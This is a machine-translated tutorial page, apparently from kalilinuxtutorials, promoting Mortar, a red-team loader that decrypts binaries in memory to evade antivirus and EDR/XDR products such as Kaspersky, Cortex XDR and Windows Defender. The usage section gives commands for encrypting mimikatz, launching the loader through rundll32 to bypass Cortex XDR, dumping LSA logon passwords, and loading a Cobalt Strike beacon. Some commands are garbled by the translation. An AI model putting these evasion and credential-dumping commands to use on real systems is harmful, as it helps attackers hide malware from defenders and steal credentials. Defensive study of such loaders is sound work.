# 迫击炮:规避技术，以挫败和转移检测和预防的安全产品(反病毒/EDR/XDR)

> 原文：<https://kalilinuxtutorials.com/mortar/>

[![](img/b3186026cdc6e57917c5358a3476db8c.png)](https://blogger.googleusercontent.com/img/a/AVvXsEh9gSOy7A9yubm3GDUaxzyByvakdl-yOJhF8SnNJLlK79w2AwxJgHky9xDGrT0Y9ZPYh2pN_mTyhbEwFsolQ_2WpnvZNI_yM9NwcfJ2b52Pfpv4__Ah1y2w3OhuMHg-XbZj4YNx75P2hElxs5_pnbVlhEXkSd1YE1IyhenRlBPuobSvmMo1wEZ2n91M=s676)

**Mortar** 是一种红色组队规避技术，用于挫败和转移安全产品的检测和防范。Mortar Loader 对内存流中选定的二进制文件进行加密和解密，并直接执行，而不会将任何恶意指示器写入硬盘。Mortar 能够绕过现代防病毒产品和高级 XDR 解决方案，并且已经过测试，并确认可以绕过以下内容:

*   卡巴斯基
*   ESET
*   Malwarebytes
*   迈克菲
*   皮层 XDR
*   Windows defender
*   Cylance
*   趋势科技
*   Bitdefender
*   诺顿赛门铁克

**用途**

**加密器**

**root@kali >。/encryptor-f mimikatz.exe-o bin . enc**

**加载程序(DLL)**

为了绕过 Cortex XDR，在同一个文件夹中添加 agressor.dll 和 bin.enc，并编写以下 bat 文件

**@ echo off
cmd.exe/c rundll32.exe agressor . dll，隐身**

正常情况下，您可以直接执行 agressor.dll

**rundll32.exe agressor . dll，12 月**

**加载程序(EXE)**

可执行版本有更多的选项供您使用，因为您可以为加载的二进制文件传递命令

**米米卡茨垃圾场 LSA
deliver.exe-d-c sekurlsa::logon passwords-f 米米米卡茨. enc
钴击信标
deliver.exe-d-f 钴. enc**

**编译加载程序(仅限 windows)**

该项目已经使用 FPC(免费 Pascal)进行了编码，通过下载并安装 Lazarus IDE(https://www.lazarus-ide.org/index.php?page=downloads)并导航到文件>打开->运行->构建，编译过程非常简单

**编译加密器(Linux/BSD/Arm/MAC OS//windows)**

要么从官方网站下载安装 Lazarus-IDE(https://www . Lazarus-IDE . org/index . PHP？页面=下载量)

Debian & Ubuntu
安装 fpc
安装 lazarus-ide

[**Download**](https://github.com/0xsp-SRD/mortar)